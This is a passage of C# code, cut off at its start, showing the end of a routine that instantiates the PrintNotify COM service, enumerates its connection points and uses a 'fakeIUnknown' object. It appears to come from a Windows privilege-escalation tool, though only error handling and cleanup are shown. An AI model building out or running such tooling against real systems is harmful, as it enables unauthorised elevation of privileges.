                                fakeIUnknown.GetIUnknown();
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine(e);
                            }

                        }
                        else
                        {
                            Console.WriteLine($"[!] No more elements");
                        }

                        Marshal.FreeHGlobal(pceltFetched);
                        Marshal.Release(IConnectionPointContainerPtr);
                    }
                    else
                    {
                        Console.WriteLine($"[!] Cannot QueryInterface IConnectionPointContainer hr = {hr}");
                    }
                    Marshal.Release(printNotify);
                }
                else
                {
                    Console.WriteLine($"[!] Cannot CreateInstance PrintNotify hr = {hr}");
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
